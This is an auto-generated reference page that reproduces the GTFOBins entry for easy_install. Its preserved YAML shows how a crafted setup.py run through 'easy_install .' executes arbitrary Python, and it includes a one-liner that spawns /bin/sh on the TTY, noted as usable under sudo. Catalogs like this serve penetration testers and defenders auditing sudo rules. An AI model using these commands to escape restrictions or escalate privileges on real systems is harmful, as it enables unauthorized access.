---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# easy_install

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `easy-install` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/easy_install` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [easy_install](../../tools/linux/easy-install.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | easy-install |
| name | easy_install |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/easy-install/ |

## Preserved Source Material

````yaml
_body: ''
_name: easy_install
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/easy_install
functions:
  inherit:
  - code: 'echo ''...'' >setup.py

      easy_install .'
    comment: 'This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed
      as argument (`.`).


      Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:


      ```

      echo ''import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")'' >setup.py

      ```'
    contexts:
      sudo: null
      unprivileged: null
    from: python
````
